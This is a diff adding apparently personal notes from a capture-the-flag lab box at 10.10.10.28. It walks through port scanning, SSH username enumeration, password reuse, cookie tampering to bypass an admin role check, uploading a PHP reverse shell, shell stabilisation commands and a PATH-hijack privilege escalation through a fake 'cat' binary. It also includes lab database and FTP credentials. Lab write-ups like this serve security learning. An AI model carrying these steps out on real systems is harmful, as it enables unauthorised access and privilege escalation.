@@ -1,0 +1,87 @@
+Connected to Openvpn
+pinged 10.10.10.28
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.28 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 
+This line essentially stores the ports that are active
+grep matches those lines only that are not just single numbers
+cuts up the nmap result into components with the delimiter to just just port numbers
+replaces new line with a comma and replaces ,$ with a blank
+This gives the ports in the format of port1,port2,port3
+nmap -sC -sV -p$ports 10.10.10.28
+Searches nmap scanner on the ip with the ports we found active
+Found two services
+Open SSH and Apache
+22 and 80 
+Checking to see if that version of Open SSH is exploitable
+openssh 7.6.p1 
+Did find one on Exploit DB that enumerates Username however it just checks if username is there or not
+While I was waiting for metasploit to install I wanted to check if the Apache one was exploitable
+Apache httpd 2.4.29
+There is a vulnerablity CVE-2019-0211
+Considering it was an apache website I tried to open it on firefox
+Nothing much just a static website
+however there is an email at the bottom with the name admin maybe thats a user on the server.
+Will try the openssh exploit to see if that is one 
+CVE:
+2018-15473
+It was giving false positives showing admin and other random as verified will try another exploit
+Will try it on msf to see if that works
+This worked admin was not found
+Checking root,administrator also not found
+Found a wordlist of common service accounts that didnt work either
+Came across nitko to scan the apache server
+Found a CGI directory
+This gave a login page
+Gobuster was used to enumerate what other directories there could be
+Reusing the password from Archetype 
+MEGACORP_4dm1n!!
+worked with admin username
+The uploads page needs a superadmin type
+Edited the cookie to be sent with role as admin and random number in intruder from 1 to 100 this is done in the noraml 
+accounts tab id is changed
+Used that id 86575 was able to get into upload section
+Uploaded the php reverse shell to get a shell back
+Changed the host ip my vms 
+Going to 
+url/uploads/name-of-file-uploaded 
+activated the shell
+Used the walkthrough code
+SHELL=/bin/bash script -q /dev/null
+Ctrl-Z
+stty raw -echo
+fg
+reset
+xterm
+Shell sets the preffered compiler Makes it bash
+script sends the log to the black hole '/dev/null'
+stty changes terminal behaviour
+raw makes it ignore ctrlz /ctrl c commands
+-echo disables echo
+fg makes it run in the foreground
+reset resetst the terminal 
+xterm launches a terminal for an x window system
+
+
+In db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+using id robert reveals the group bugtracker
+find / - type f -group bugtracker 2>/dev/null
+reveals
+/usr/bin/bugtracker
+This is a binary strings gives the strings in a binary executable
+The cat is different at /usr/bin/cat and bin/cat
+We'll be overwritng the usr one
+export PATH=/tmp:$PATH
+cd /tmp/
+echo '/bin/sh' > cat
+chmod +x cat
+
+
+            <Host>10.10.10.44</Host>
+            <Port>21</Port>
+            <Protocol>0</Protocol>
+            <Type>0</Type>
+            <User>ftpuser</User>
+            <Pass>mc@F1l3ZilL4
